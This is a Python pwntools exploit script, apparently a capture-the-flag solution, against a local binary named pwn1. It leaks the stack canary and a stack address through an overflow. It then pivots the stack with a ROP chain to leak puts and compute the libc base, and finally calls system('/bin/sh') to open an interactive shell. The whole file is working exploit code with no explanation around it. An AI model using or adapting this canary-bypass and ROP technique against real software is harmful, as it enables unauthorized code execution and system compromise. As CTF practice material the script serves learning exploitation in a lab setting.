from pwn import *
# context.log_level="debug"
context.arch='amd64'
elf=ELF('./pwn1')
sh=process('./pwn1')
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") 
leave_ret=0x0400879
pop_rdi=0x0400923
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']

sh.recvuntil(">")
sh.send('a'*89)
sh.recvuntil("a"*88)
#cannay=u64(sh.recv(7).rjust(8,"\x00"))
cannay = u64(sh.recv(8))-0x61
stack_addr=u64(sh.recv(6).ljust(8,"\x00"))-0x70 

print "cannry: "+hex(cannay)
print "stack_addr: "+hex(stack_addr)
sh.recvuntil(">")
payload=flat([stack_addr+0x60,pop_rdi,puts_got,puts_plt,0x0400630]) 

payload+='a'*48+p64(cannay)+p64(stack_addr)+p64(leave_ret)

sh.send(payload)
sh.recvuntil("\n")
puts_addr=u64(sh.recv(6).ljust(8,"\x00"))
print "puts_addr: "+hex(puts_addr)


libc_base=puts_addr-libc.sym['puts']
system_addr=libc_base+libc.sym['system']
print "system_addr:"+hex(system_addr)
binsh_a =libc_base + 0x18ce17

sh.recvuntil(">")
sh.send('a'*89)
sh.recvuntil("a"*89)
cannay=u64(sh.recv(7).rjust(8,"\x00"))
stack_addr=u64(sh.recv(6).ljust(8,"\x00"))-0x70 

print "cannry: "+hex(cannay)
print "stack_addr: "+hex(stack_addr)
sh.recvuntil(">")
payload=flat([stack_addr+0x60,pop_rdi,binsh_a,system_addr,0x0400630])
payload+='a'*48+p64(cannay)+p64(stack_addr)+p64(leave_ret)
sh.send(payload)

sh.interactive()
